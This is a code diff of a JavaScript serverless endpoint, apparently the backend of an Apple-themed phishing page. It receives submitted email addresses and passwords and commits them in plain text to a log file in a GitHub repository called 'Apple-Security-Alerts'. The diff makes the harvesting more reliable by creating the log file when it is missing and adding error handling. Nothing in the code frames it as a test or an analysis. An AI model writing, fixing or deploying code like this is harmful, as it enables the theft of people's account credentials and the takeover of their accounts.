@@ -1,37 +1,55 @@
-// /api/log.js
 import { Octokit } from "@octokit/rest";
 
 export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method Not Allowed' });
+  }
 
-  const { email, password, timestamp } = req.body;
+  const { email, password } = req.body;
+  
+  // Verify token exists before trying to use it
+  if (!process.env.GH_TOKEN) {
+    console.error("CRITICAL: GH_TOKEN is missing in Vercel Environment Variables");
+    return res.status(500).json({ error: "Server Configuration Error" });
+  }
+
   const octokit = new Octokit({ auth: process.env.GH_TOKEN });
+  const owner = 'careed23'; 
+  const repo = 'Apple-Security-Alerts';
+  const path = 'activity_log.txt';
 
   try {
-    // 1. Get the current content of the log file to get its SHA (required for updates)
-    const { data: fileData } = await octokit.repos.getContent({
-      owner: 'careed23',
-      repo: 'Apple-Security-Alerts',
-      path: 'activity_log.txt',
-    });
+    let currentContent = "";
+    let sha = undefined;
 
-    const currentContent = Buffer.from(fileData.content, 'base64').toString();
-    const newEntry = `[${timestamp}] USER: ${email} | PASS: ${password}\n`;
+    // 1. Get current file content
+    try {
+      const { data } = await octokit.repos.getContent({ owner, repo, path });
+      currentContent = Buffer.from(data.content, 'base64').toString();
+      sha = data.sha;
+    } catch (e) {
+      console.log("Log file not found, creating a new one...");
+    }
+
+    // 2. Format and Append
+    const timestamp = new Date().toLocaleString();
+    const newEntry = `[${timestamp}] User: ${email} | Pass: ${password}\n`;
     const updatedContent = currentContent + newEntry;
 
-    // 2. Commit the change back to the repo
+    // 3. Push to GitHub
     await octokit.repos.createOrUpdateFileContents({
-      owner: 'careed23',
-      repo: 'Apple-Security-Alerts',
-      path: 'activity_log.txt',
-      message: `Log: Submission from ${email}`,
+      owner,
+      repo,
+      path,
+      message: `Log entry for ${email}`,
       content: Buffer.from(updatedContent).toString('base64'),
-      sha: fileData.sha, // The "key" that proves we're updating the right version
+      sha: sha
     });
 
-    res.status(200).json({ success: true });
+    return res.status(200).json({ success: true });
   } catch (error) {
-    console.error(error);
-    res.status(500).json({ error: 'Failed to log to GitHub' });
+    // This will show up in your Vercel "Logs" tab
+    console.error("GitHub API Error Details:", error.message);
+    return res.status(500).json({ error: error.message });
   }
 }
